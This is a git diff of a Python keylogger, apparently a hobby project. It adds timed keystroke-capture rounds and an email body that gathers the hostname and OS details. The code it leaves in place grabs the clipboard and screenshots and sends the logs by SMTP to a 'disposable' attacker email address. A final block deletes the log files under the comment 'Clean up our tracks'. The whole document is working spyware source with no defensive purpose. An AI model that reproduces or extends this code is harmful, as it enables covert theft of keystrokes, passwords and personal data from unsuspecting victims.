@@ -26,8 +26,6 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-# Modules to encrypt files
-from cryptography.fernet import Fernet
 
 # Modules to collect time and OS information 
 import time 
@@ -51,12 +49,13 @@ clipboardInformation = "clipboard.txt"
 audioInformation = "sample.wav"
 sreenshotInformation = "sample.png"
 
+
+
 filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"
 
-totalKeys = 0
-keys =[]
-
 recordingTime = 10
+timeRounds = 15
+numberOfRoundsFinal = 3
 
 #variables for Email 
 email_address = "hacker.heart20@gmail.com" # Enter disposable email here
@@ -74,7 +73,13 @@ def send_logs_via_email(filename, attachment, destinationAddr):
     messageVar['To'] = destinationAddr
     messageVar['Subject'] = "Log File"
 
-    body = "Body_of_the_mail"
+    
+    hostname = socket.gethostname()
+
+    body = "System Information" + "\n"+ "Processor: " + platform.processor() + "\n" + "System: " + platform.system() + "Version " + platform.version() + '\n' + "Machine: " + platform.machine() + "\n" +"Hostname: " + hostname + "\n" 
+
+
+
     messageVar.attach(MIMEText(body, 'plain'))
 
     filename = filename
@@ -94,7 +99,7 @@ def send_logs_via_email(filename, attachment, destinationAddr):
     smtpVar.quit()
 
 
-#send_logs_via_email(keysInformation, filePath + "/" + keysInformation, destinationAddr)
+
 
 
 #########################
@@ -136,7 +141,7 @@ def copy_data_from_clipboard():
 		except Exception as e:
 			rf.write("Clipboard Data: NULL")
 
-copy_data_from_clipboard()
+#copy_data_from_clipboard()
 
 
 #########################
@@ -159,50 +164,87 @@ def record_screenshot():
 	im = ImageGrab.grab()
 	im.save(filePath + "/" + sreenshotInformation)
 
-record_screenshot()
-
-
+# record_screenshot()
 
 
 #########################
-#Key Listener
+#Time Control
 #########################
 
-def key_is_pressed(Key):
-	global totalKeys,keys
+numberOfRounds = 0
+currentTime = time.time()
+stopAtTime = time.time() + timeRounds
 
-	print(Key)
-	keys.append(Key)
-	totalKeys += 1
-
-	if totalKeys >= 1:
-		totalKeys = 0
-		write_keys_on_file(keys)
-		keys=[]
+while numberOfRounds < numberOfRoundsFinal :
 
 
-def write_keys_on_file(keys):
-	with open(filePath + "/"+keysInformation,"a") as f:
-		for key in keys:
-			k = str(key).replace("'","")
-			if k.find("space") > 0:
-				f.write("\n")
-				f.close()
-			elif k.find("Key") == -1:
-				f.write(k)
-				f.close()
+	#########################
+	#Key Listener
+	#########################
+
+	totalKeys = 0
+
+	keys =[]
+
+	def key_is_pressed(Key):
+		global totalKeys,keys,currentTime
+
+		print(Key)
+		keys.append(Key)
+		totalKeys += 1
+
+		currentTime = time.time()
+
+		if totalKeys >= 1:
+			totalKeys = 0
+			write_keys_on_file(keys)
+			keys=[]
+
+
+	def write_keys_on_file(keys):
+		with open(filePath + "/"+keysInformation,"a") as f:
+			for key in keys:
+				k = str(key).replace("'","")
+				if k.find("space") > 0:
+					f.write("\n")
+					f.close()
+				elif k.find("Key") == -1:
+					f.write(k)
+					f.close()
 
 
 
-def key_is_released(key):
-	if key == Key.esc:
-		return False
+	def key_is_released(key):
+		if key == Key.esc:
+			return False
+		if currentTime > stopAtTime:
+			return False
 
 
-with Listener(on_press = key_is_pressed, on_release = key_is_released) as listener:
-	listener.join()
+	with Listener(on_press = key_is_pressed, on_release = key_is_released) as listener:
+		listener.join()
 
-	
+	if currentTime > stopAtTime:
+		with open(filePath + "/"+keysInformation,"w") as f:
+			f.write(" ")
+		# record_screenshot()
+		# send_logs_via_email(sreenshotInformation, filePath + "/" + sreenshotInformation, destinationAddr)
+		# copy_data_from_clipboard()
+
+		numberOfRounds +=1
+
+		currentTime = time.time()
+		stopAtTime = time.time() + timeRounds
+
+
+
+# Clean up our tracks and delete files
+delete_files = [systemInformation, clipboardInformation, keysInformation, sreenshotInformation, audioInformation]
+for file in delete_files:
+    os.remove(file_merge + file)
+
+
+
 
 
 
